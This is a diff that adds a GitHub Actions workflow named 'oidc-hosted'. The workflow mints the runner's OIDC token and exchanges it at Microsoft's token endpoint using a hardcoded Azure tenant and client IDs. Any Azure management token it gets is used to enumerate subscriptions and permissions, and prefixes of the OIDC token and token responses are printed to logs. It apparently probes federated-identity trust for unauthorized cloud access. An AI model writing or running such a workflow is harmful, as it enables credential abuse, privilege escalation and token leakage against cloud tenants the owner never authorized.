@@ -1,0 +1,39 @@
+name: oidc-hosted
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  oidc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: mint
+        shell: bash
+        run: |
+          set +e
+          echo "SUBJ=$GITHUB_SERVER_URL/$GITHUB_REPOSITORY ref=$GITHUB_REF repo=$GITHUB_REPOSITORY"
+          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          OIDC=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          echo "OIDC=${OIDC:0:100}"
+          TOK=$(python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" <<<"$OIDC" 2>/dev/null)
+          [ -z "$TOK" ] && { echo NO_OIDC; exit 0; }
+          echo "OIDC_LEN=${#TOK}"
+          for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c; do
+          for CID in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab; do
+            R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+              --data-urlencode grant_type=client_credentials \
+              --data-urlencode client_id=$CID \
+              --data-urlencode scope=https://management.azure.com/.default \
+              --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+              --data-urlencode client_assertion=$TOK)
+            echo "MINT $TEN $CID => ${R:0:260}"
+            AT=$(python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" <<<"$R" 2>/dev/null)
+            if [ -n "$AT" ]; then
+              echo "ARM_TOKEN_OK len=${#AT}"
+              curl -s -m 30 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions?api-version=2022-12-01" | head -c 900; echo
+              curl -s -m 30 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" | head -c 900; echo
+            fi
+          done
+          done
